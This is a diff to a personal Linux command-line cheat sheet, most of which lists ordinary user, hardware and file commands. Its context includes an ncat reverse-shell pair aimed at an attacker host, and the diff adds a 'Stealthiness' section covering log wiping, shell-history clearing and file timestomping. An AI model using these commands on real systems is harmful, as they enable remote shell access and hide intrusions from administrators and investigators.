@@ -6,11 +6,11 @@
 adduser USER                            # add USER w/ system defaults
 useradd USER                            # add USER, native binary
 useradd -m -G users,wheel -s /bin/bash USER # add new USER manually
+useradd --system                        # no homedir, no passwd, can't log in
 deluser USER                            # remove a user
 delgroup GROUP                          # remove a group
 usermod -u UID USER                     # change UID
 usermod -g GID USER                     # change default group
-useradd --system                        # no homedir, no passwd, can't log in
 groupmod -g GID group                   # change GID of group
 gpasswd -a USER GROUP                   # add awdeorio to audio group
 smbpasswd -a USER                       # new Samba user
@@ -25,7 +25,7 @@ w                                       # list users logged in
 who                                     # list users logged in
 finger USER                             # directory info about USER
 whoami                                  # current user
-logname                                 # current logged in user (try w/ sudo)
+logname                                 # current logged in user (e.g., w/ sudo)
 
 # Machines
 hostname                                # name of this computer
@@ -34,6 +34,8 @@ uname -a                                # info about OS, compiler, etc.
 cat /proc/cpuinfo                       # CPU size/features
 cat /proc/meminfo                       # memory size/features
 uptime                                  # time since power on
+lspci                                   # list PCI devices
+lspci -vv                               # ^^^ with lots of info
 
 # Files
 ls                                      # list directory contents
@@ -52,8 +54,8 @@ dircolors                               # set LS_COLORS using defaults
 dircolors -b                            # ^^^ for Bourne shell
 dircolors -b ${HOME}/.DIR_COLORS        # ^^^ with custom colors
 stat FILE                               # file modification times, etc.
-touch FILE                              # update modification time to NOW
 touch FILE                              # create empty file, if it doesn't exist
+touch FILE                              # update mtime, atime to NOW
 
 # Paths
 pwd                                     # current directory
@@ -218,6 +220,23 @@ ATTACK_HOST $ ncat TARGET_HOST 8080 --ssl
 # Note: this version of netcat (ncat) ships with nmap
 ATTACK_HOST $ ncat -l -p 8080 -vv --ssl
 TARGET_HOST $ ncat -e /bin/bash ATTACK_HOST 8080 --ssl
+
+# Stealthiness
+last                                    # successful login history
+lastb                                   # bad login attempts
+lastlog                                 # most recent login
+echo > /var/log/wtmp                    # clear successful login history
+echo > /var/log/btmp                    # clear bad login history
+echo > /var/log/lastlog                 # clear recent login history
+unset HISTFILE                          # don't write history for this session
+history -c                              # clear shell history
+edit ~/.history ~/.bash_history         # edit history
+touch -d "2 hours ago" FILE             # change atime, mtime w/ relative time
+touch -d "2016-01-01"                   # ^^^ date
+touch -d "2016-01-01 12:34:56"          # ^^^ date and time
+touch -d "2015-01-01 12:34:56 +0400"    # ^^^ date, time, w/ time zone
+touch -r REF_FILE FILE                  # match attributes of FILE to REF_FILE
+edit /var/log/{messages,syslog}         # remove info about changed time
 
 # Email
 sendmail user@example.com < email.txt   # send email from CLI
